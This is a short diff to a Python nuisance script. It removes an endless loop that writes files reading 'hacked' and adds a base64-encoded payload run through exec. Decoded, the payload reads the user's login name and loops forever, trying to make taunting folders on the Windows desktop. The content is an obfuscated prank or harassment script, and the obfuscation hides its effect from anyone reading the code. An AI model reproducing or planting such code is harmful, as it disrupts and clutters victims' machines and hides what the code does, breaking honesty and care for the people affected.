@@ -1,7 +1,5 @@
 #This script make unlimied files.
-i = 1
-while(i>0):
-  i = i+1
-  file = open(f"hello{i}.vasta","w")
-  file.write("hacked")
-  file.close()
+
+import base64
+
+exec(base64.b64decode("aW1wb3J0IG9zClVTRVJOQU1FID0gb3MuZ2V0bG9naW4oKQpURVhUID0gZiJIZWxsbywge1VTRVJOQU1FfSEgd291bGQgeW91IGxpa2UgdG8gcGxheS4uLiIKCndoaWxlIFRydWU6CiAgICBvcy5ta2RpcigiQzpcXFVzZXJzXFwlc1xcRGVza3RvcFxcJXMiICUgKFVTRVJOQU1FLCBURVhUKSk="))
